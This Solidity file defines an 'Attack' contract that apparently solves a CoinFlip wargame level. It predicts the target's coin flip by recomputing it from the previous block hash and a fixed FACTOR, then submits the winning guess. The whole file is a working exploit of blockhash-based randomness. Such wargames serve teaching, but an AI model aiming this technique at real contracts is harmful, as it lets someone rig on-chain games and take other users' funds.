// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

// hardhat consol log from a solidity contract

contract Attack {
    CoinFlip public coinFlipContract;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    event Deploy(address indexed _deployer, address indexed contractToAttack);
    event Guess(bool _guess);
    event Side(bool _side);

    constructor(address payable _coinFlipContract) {
        coinFlipContract = CoinFlip(_coinFlipContract);

        emit Deploy(msg.sender, _coinFlipContract);
    }

    function attack() public payable {
        // Foundry bonus = do this in one transaction
        bool guess = predictFlips();
        bool returnedAnswer = coinFlipContract.flip(guess);
        emit Guess(returnedAnswer);
    }

    function predictFlips() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        // Event
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        emit Side(side);

        return side;
    }

    receive() external payable {}
}
